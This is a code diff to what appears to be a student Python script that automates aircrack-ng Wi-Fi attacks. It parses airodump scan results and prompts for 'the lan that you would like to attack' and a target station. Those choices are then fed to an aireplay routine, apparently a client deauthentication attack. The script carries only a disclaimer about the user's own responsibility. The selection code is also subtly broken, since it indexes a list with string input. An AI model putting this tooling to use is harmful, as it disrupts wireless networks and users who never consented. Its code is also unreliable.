@@ -74,6 +74,19 @@ def parse_csv(file, *fnames):
     return vals
 
 
+def parse_csv_ver2(file):
+
+    with open (file,'r') as csv_file:
+        csv_reader = csv.reader(csv_file)
+        i=0
+        vals = []
+        for line in csv_reader:
+
+            vals.append(line)
+            print (i,line)
+            i += 1
+        return vals
+
 def main():
     print("This Project Have been done For School , you use its on our own resbonsiblity")
 
@@ -93,18 +106,19 @@ def main():
     system('xfce4-terminal --tab python airmon_auto.py')  # open new shell?
     airodump_ng(mon_card, file)
     work_file = ('data-01.csv')
-    data = parse_csv(work_file, 'BSSID', 'channel', 'Station MAC')
+    #data = parse_csv(work_file, 'BSSID', 'channel', 'Station MAC')
+    data = parse_csv_ver2(work_file)
+    ssid = input("Enter the lan that you would like to attack (click the number) :")
+    bssid_atc_temp = data[ssid]
+    bssid_atc = bssid_atc_temp[0]
+    staion = input("Enter the station :")
+    staion_atc_temp = data[staion]
+    staion_atc = staion_atc_temp[0]
+    channel = bssid_atc_temp[3]
 
-    # print(data)
-    # print(' \n '.join(map(str, data)))
-    # regex = r"\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d"
-
-    bssid = raw_input("Enter the lan that you would like to attack :")
-    staion = raw_input("Enter the station :")
     air_mon(wireless_card, channel)
-    # TODO implement station of this bssid
 
-    aire_play(bssid, staion)
+    aire_play(bssid_atc, staion_atc)
 
 
 # TODO implement ival of input???
